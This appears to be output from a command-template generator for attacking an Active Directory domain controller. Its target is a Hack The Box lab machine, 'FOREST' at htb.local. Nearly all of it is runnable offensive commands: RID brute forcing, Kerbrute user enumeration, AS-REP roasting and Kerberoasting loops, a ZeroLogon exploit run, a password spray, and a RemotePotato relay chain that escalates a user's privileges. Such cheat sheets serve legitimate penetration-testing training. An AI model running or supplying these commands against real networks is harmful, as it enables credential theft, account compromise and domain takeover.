  Enter info about a target, and the script will fill out the most common initial enumeration commands for you! 
```
 # Zone transfer (Unlikely with AD)
dig axfr htb.local @10.10.10.161

# Guest RID brute
netexec smb htb.local -u anonymous -p '' --rid-brute 10000
impacket-lookupsid htb.local/anonymous@10.10.10.161

# Kerbrute user enumeration
kerbrute userenum -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.161

# RPC Enumeration
rpcclient -U "" -N 10.10.10.161

# AS Rep Roasting
for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/${user} | grep -v Impacket; done

# Kerberoasting
faketime -f +7h GetUserSPNs.py -target-domain htb.local -usersfile users.txt -dc-ip FOREST.htb.local htb.local/guest -no-pass
GetUserSPNs.py -no-preauth 'guest' -usersfile 'users.txt' -dc-host 'FOREST.htb.local' 'htb.local'/

# LDAP Enumeration
ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}' > users.txt
kerbrute userenum --dc FOREST.htb.local -d htb.local users.txt

# ZeroLogon Check
sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py FOREST 10.10.10.161

# Bloodhound Python ingestor
faketime -f +7h bloodhound-python -c ALL -u 'guest' -p '' -d htb.local -dc FOREST.htb.local -ns 10.10.10.161

# Password Spray
netexec smb 10.10.10.161 -u users.txt -p 'Password123!' --continue-on-success

# RemotePotato Check
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.161:9999
sudo impacket-ntlmrelayx -t ldap://10.10.10.161 --no-wcf-server --escalate-user normal_user
.\RemotePotato0.exe -m 2 -r 10.10.14.2 -x 10.10.14.2 -p 9999 -s 1

# SMB Enumeration
sudo smbclient -N -L //10.10.10.161
smbmap -u '' -p '' -H 10.10.10.161
